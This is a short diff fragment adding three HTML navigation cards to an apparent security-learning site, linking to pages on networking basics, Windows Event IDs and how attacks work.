+                    <a href="networking-basics.html" class="card"><div class="card-icon"><i class="fas fa-network-wired"></i></div><h3>Networking</h3><p>Network fundamentals</p></a>
+                    <a href="windows-events.html" class="card"><div class="card-icon"><i class="fas fa-list"></i></div><h3>Windows Events</h3><p>Complete Event ID reference</p></a>
+                    <a href="attack-basics.html" class="card"><div class="card-icon"><i class="fas fa-skull-crossbones"></i></div><h3>How Attacks Work</h3><p>Attack patterns</p></a>
                 </div>
 
             </div>
